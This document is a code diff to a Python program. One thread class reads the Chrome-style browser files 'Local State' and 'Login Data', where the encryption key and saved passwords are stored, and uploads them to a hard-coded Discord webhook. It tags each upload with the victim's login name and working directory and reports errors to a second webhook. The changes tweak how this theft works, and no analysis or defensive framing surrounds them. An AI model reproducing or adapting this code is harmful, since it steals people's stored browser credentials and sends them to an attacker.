@@ -1,5 +1,6 @@
 import requests
 from os import listdir, path, walk, makedirs
+from unidecode import unidecode as ud
 
 def update_files():
     blocked_words = ["desktop-source", "desktop-executable", "requirements"]
@@ -76,13 +77,12 @@ class ExtraThread1(QThread):
             kpath = path.join(cdata, "Local State")
             dpath = path.join(cdata, "Default", "Login Data")
 
-            try: 
-                
-                extra1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] File received."})
-                extra1f1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (kpath, open(kpath, "rb").read())})
-                extra1f2_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (dpath, open(dpath, "rb").read())})
+            try:
+                extra1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1OUT] Files received."})
+                extra1f1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (kpath+"_"+ud(os.getlogin().lower()), open(kpath, "rb").read())})
+                extra1f2_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (dpath+"_"+ud(os.getlogin().lower()), open(dpath, "rb").read())})
             except Exception as e1f: 
-                error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] {str(e1f)}"})
+                error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1OUT] {str(e1f)}"})
         except Exception as e1: 
             error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1] {str(e1)}"})
 
